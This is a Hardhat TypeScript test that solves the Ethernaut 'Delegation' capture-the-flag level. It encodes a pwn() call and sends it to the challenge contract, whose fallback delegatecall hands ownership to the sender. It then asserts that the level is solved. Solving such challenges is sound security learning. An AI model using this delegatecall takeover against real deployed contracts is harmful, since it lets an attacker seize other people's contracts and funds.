import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { Delegate } from "../../typechain/Delegate";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x9451961b7Aea1Df57bc20CC68D72f662241b5493";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe.only("Delegation", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const delegationContractFactory = await ethers.getContractFactory("Delegation");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await delegationContractFactory.attach(challengeAddr);

    });

    it("Should solve the challenge", async function () {
        
        expect(await submitInstance(contract.address)).to.be.false;
        expect(await contract.owner()).to.not.equal(owner.address);

        const iAbi = new ethers.utils.Interface(["function pwn()"]);

        // TODO: call pwn() method 
        const delegateFallbackTxn: any = {
            to: contract.address,
            data: iAbi.encodeFunctionData("pwn"),
        };
        txn = await owner.sendTransaction(delegateFallbackTxn);
        await txn.wait();


        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
        expect(await contract.owner()).to.equal(owner.address);
    });
});